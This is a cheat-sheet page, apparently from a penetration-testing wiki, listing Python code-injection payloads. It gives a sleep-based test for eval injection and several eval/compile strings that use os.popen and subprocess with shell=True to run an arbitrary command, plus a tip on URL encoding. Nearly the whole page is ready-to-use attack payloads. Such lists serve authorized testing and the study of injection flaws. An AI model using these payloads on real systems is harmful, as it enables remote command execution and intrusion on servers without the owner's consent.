# Code Injection - Python

## Testing if vulnerable

```python
eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))
```

## Payloads

{% hint style="warning" %}
Do not forget to URL encode key characters.
{% endhint %}

```python
# Example with one expression
__import__('os').popen('COMMAND').read()
```

```python
# Example with multiple expressions, separated by commas
str("-"*50),__import__('os').popen('COMMAND').read()
```

```python
# Examples with one expression
eval(compile("""__import__('os').popen(r'COMMAND').read()""",'','single'))
eval(compile("""__import__('subprocess').check_output(r'COMMAND',shell=True)""",'','single'))
```

```python
# Examples with multiple statements, separated by semicolons
eval(compile("""__import__('os').popen(r'COMMAND').read();import time;time.sleep(2)""",'','single'))
eval(compile("""__import__('subprocess').check_output(r'COMMAND',shell=True);import time;time.sleep(2)""",'','single'))
```

```python
# When global __import__ trick does not work
eval(compile("""for x in range(1):\n import os\n os.popen(r'COMMAND').read()""",'','single'))
eval(compile("""for x in range(1):\n import subprocess\n subprocess.Popen(r'COMMAND',shell=True, stdout=subprocess.PIPE).stdout.read()""",'','single'))
eval(compile("""for x in range(1):\n import subprocess\n subprocess.check_output(r'COMMAND',shell=True)""",'','single'))
```

## Sources

{% embed url="https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html" %}

{% embed url="http://www.floyd.ch/?p=584" %}

{% embed url="http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html" %}
